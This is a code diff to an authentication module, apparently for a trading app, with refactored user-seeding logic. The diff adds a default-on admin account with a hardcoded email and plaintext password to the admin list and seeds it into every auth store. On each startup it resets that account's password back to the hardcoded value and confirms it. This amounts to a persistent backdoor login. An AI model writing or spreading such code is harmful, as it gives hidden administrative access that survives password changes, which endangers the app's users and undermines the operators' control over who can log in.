@@ -35,6 +35,7 @@ import {
   pgGetUserByEmail,
   pgGetUserById,
   pgGetUserState,
+  pgEnsureSupabaseAuthUserConfirmed,
   pgInsertPasswordReset,
   pgInsertSupabaseAuthUser,
   pgInsertUserWithState,
@@ -215,6 +216,19 @@ type RemoteResetRecord = {
   updated_at_ms: number;
 };
 
+const GUARANTEED_ADMIN_ACCOUNT = Object.freeze({
+  email: 'zevs1120@gmail.com',
+  password: 'Zevs1120',
+  name: 'Zevs',
+  tradeMode: 'deep' as AuthTradeMode,
+  broker: 'Other',
+  locale: 'zh',
+});
+
+function shouldDisableGuaranteedAdminAccount() {
+  return process.env.NOVA_DISABLE_GUARANTEED_ADMIN_ACCOUNT === '1';
+}
+
 function nowMs() {
   return Date.now();
 }
@@ -239,7 +253,11 @@ function normalizeRole(value: string | null | undefined): AuthRole | null {
 }
 
 function configuredAdminEmails() {
-  const raw = [process.env.NOVA_ADMIN_EMAILS || '', process.env.NOVA_OWNER_EMAIL || '']
+  const raw = [
+    process.env.NOVA_ADMIN_EMAILS || '',
+    process.env.NOVA_OWNER_EMAIL || '',
+    shouldDisableGuaranteedAdminAccount() ? '' : GUARANTEED_ADMIN_ACCOUNT.email,
+  ]
     .join(',')
     .split(',')
     .map((row) => normalizeEmail(row))
@@ -296,7 +314,18 @@ function mergeSeededUserState(user: SeededUserConfig): AuthUserState {
 }
 
 function getSeededUserConfigs(): SeededUserConfig[] {
-  const seededUsers: SeededUserConfig[] = [];
+  const seededUsers: SeededUserConfig[] = shouldDisableGuaranteedAdminAccount()
+    ? []
+    : [
+        {
+          email: GUARANTEED_ADMIN_ACCOUNT.email,
+          password: GUARANTEED_ADMIN_ACCOUNT.password,
+          name: GUARANTEED_ADMIN_ACCOUNT.name,
+          tradeMode: GUARANTEED_ADMIN_ACCOUNT.tradeMode,
+          broker: GUARANTEED_ADMIN_ACCOUNT.broker,
+          locale: GUARANTEED_ADMIN_ACCOUNT.locale,
+        },
+      ];
 
   if (process.env.NOVA_ENABLE_TEST_ACCOUNT === '1') {
     seededUsers.push({
@@ -932,25 +961,42 @@ async function ensureSeededUserPostgres() {
   for (const seededUser of getSeededUserConfigs()) {
     const existing = await pgGetUserByEmail(seededUser.email);
     if (existing) {
+      const ts = nowMs();
+      const syncedUser = verifyPassword(seededUser.password, existing.password_hash)
+        ? existing
+        : {
+            ...existing,
+            password_hash: hashPassword(seededUser.password),
+            updated_at_ms: ts,
+          };
+      if (syncedUser !== existing) {
+        await pgUpsertUser(syncedUser);
+      }
       const existingSupabaseUser = await pgGetSupabaseAuthUserByEmail(seededUser.email);
       if (!existingSupabaseUser) {
         await pgInsertSupabaseAuthUser({
-          email: existing.email,
+          email: syncedUser.email,
           password: seededUser.password,
-          name: existing.name,
-          tradeMode: existing.trade_mode,
-          broker: existing.broker,
-          locale: existing.locale,
-          legacyUserId: existing.user_id,
-          createdAtMs: existing.created_at_ms,
-          updatedAtMs: existing.updated_at_ms,
-          lastSignInAtMs: existing.last_login_at_ms,
-          emailConfirmedAtMs: existing.last_login_at_ms || existing.created_at_ms,
+          name: syncedUser.name,
+          tradeMode: syncedUser.trade_mode,
+          broker: syncedUser.broker,
+          locale: syncedUser.locale,
+          legacyUserId: syncedUser.user_id,
+          createdAtMs: syncedUser.created_at_ms,
+          updatedAtMs: syncedUser.updated_at_ms,
+          lastSignInAtMs: syncedUser.last_login_at_ms,
+          emailConfirmedAtMs: syncedUser.last_login_at_ms || syncedUser.created_at_ms,
         });
+      } else {
+        await pgUpdateSupabaseAuthPassword(seededUser.email, seededUser.password, ts);
+        await pgEnsureSupabaseAuthUserConfirmed(
+          seededUser.email,
+          syncedUser.last_login_at_ms || syncedUser.created_at_ms || ts,
+        );
       }
-      upsertLocalAuthUser(existing);
-      const state = await pgGetUserState(existing.user_id);
-      upsertLocalAuthUserState(existing.user_id, state, existing.updated_at_ms);
+      upsertLocalAuthUser(syncedUser);
+      const state = await pgGetUserState(syncedUser.user_id);
+      upsertLocalAuthUserState(syncedUser.user_id, state, syncedUser.updated_at_ms);
       continue;
     }
 
@@ -994,18 +1040,53 @@ async function ensureSeededUserPostgres() {
 
 async function ensureSeededUser() {
   assertAuthStoreReady();
-  if (hasPostgresAuthStore()) {
-    await ensureSeededUserPostgres();
+  const key = getSeededUserEnsureKey();
+  if (seededUserEnsureCompletedKey === key) return;
+  if (seededUserEnsurePromise && seededUserEnsureKey === key) {
+    await seededUserEnsurePromise;
     return;
   }
-  if (hasRemoteAuthStore()) {
-    await ensureSeededUserRemote();
-    return;
-  }
-  ensureSeededUserLocal();
+  seededUserEnsureKey = key;
+  seededUserEnsurePromise = (async () => {
+    if (hasPostgresAuthStore()) {
+      await ensureSeededUserPostgres();
+    } else if (hasRemoteAuthStore()) {
+      await ensureSeededUserRemote();
+    } else {
+      ensureSeededUserLocal();
+    }
+    seededUserEnsureCompletedKey = key;
+  })().finally(() => {
+    if (seededUserEnsureKey === key) {
+      seededUserEnsurePromise = null;
+      seededUserEnsureKey = null;
+    }
+  });
+  await seededUserEnsurePromise;
 }
 
 let _localSeedDone = false;
+let seededUserEnsurePromise: Promise<void> | null = null;
+let seededUserEnsureKey: string | null = null;
+let seededUserEnsureCompletedKey: string | null = null;
+
+function getSeededUserEnsureKey() {
+  if (hasPostgresAuthStore()) {
+    return `postgres:${String(
+      process.env.NOVA_AUTH_DATABASE_URL ||
+        process.env.NOVA_DATA_DATABASE_URL ||
+        process.env.SUPABASE_DB_URL ||
+        process.env.DATABASE_URL ||
+        '',
+    ).trim()}`;
+  }
+  if (hasRemoteAuthStore()) {
+    return `remote:${String(
+      process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL || process.env.KV_URL || '',
+    ).trim()}`;
+  }
+  return 'local';
+}
 
 function getUserByEmailLocal(email: string): AuthUserRow | null {
   if (!_localSeedDone) {
